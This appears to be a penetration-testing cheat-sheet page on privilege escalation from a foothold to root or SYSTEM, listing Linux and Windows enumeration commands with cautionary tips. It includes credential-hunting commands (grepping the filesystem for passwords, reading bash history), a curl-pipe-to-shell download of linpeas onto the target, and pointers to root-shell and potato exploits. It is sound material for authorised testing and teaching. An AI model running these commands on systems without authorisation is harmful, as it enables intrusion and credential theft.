+++
title = "privesc"
description = "from a foothold to root or SYSTEM — what to check first, and what not to run."
weight = 6
+++

Privilege escalation is mostly careful enumeration: the way up is usually a misconfiguration sitting in plain sight. Run the automated scripts, but read their output yourself — and work through the manual checks too, since scripts miss things.

## linux: manual checks

### who and what you are

```sh
id; hostname; uname -a; cat /etc/os-release
```

```sh
# what can you run as root? (may ask for your password)
sudo -l
```

### suid binaries and capabilities

```sh
find / -perm -4000 -type f 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
```

### scheduled jobs and writable paths

```sh
cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null
```

```sh
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

### credentials lying around

```sh
grep -rIl --exclude-dir={proc,sys,usr} -i 'password' / 2>/dev/null | head -50
```

```sh
ls -la ~ /home/* /root 2>/dev/null; cat ~/.bash_history 2>/dev/null
```

> **trap**
>
> Any `sudo -l` entry or SUID binary is worth a GTFOBins lookup ([gtfobins.github.io](https://gtfobins.github.io)) — `find`, `vim`, `less`, `tar` and many more can spawn a root shell. The path matters too: `sudo /usr/bin/less /var/log/x` is exploitable even though it looks locked down.

## linux: automated

### linpeas
Huge enumeration script with colour-coded highlights. Transfer it rather than piping from the internet — targets often have no outbound access.

```sh
# on your machine
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

```sh
# on the target
curl -s http://<lhost>:8000/linpeas.sh | sh | tee /tmp/lp.txt
```

### pspy
Watches processes without root — shows cron jobs and scripts other users run, as they run.

```sh
./pspy64
```

> **trap**
>
> linpeas is loud: it reads a lot of files, and EDR will often flag it. And its red-highlighted lines are leads, not findings — confirm each one before you build on it.

## kernel exploits

```sh
uname -r
```

> **trap**
>
> Kernel exploits are the **last** resort. A failed attempt can panic the kernel and take a production server down. Exhaust the misconfigurations first, and get the client's explicit OK before running one.

## windows

### quick enumeration

```powershell
whoami /priv; whoami /groups
```

```powershell
systeminfo
```

```powershell
# services with unquoted paths containing spaces
Get-CimInstance Win32_Service | ? { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows\\' } | select Name, PathName, StartMode
```

### winPEAS

```powershell
.\winPEASx64.exe quiet
```

> **trap**
>
> `SeImpersonatePrivilege` (common for service accounts like IIS and MSSQL) usually means SYSTEM through the "potato" family of exploits — check `whoami /priv` before anything else. Unquoted service paths only matter if you can also write to one of the folders in the path.
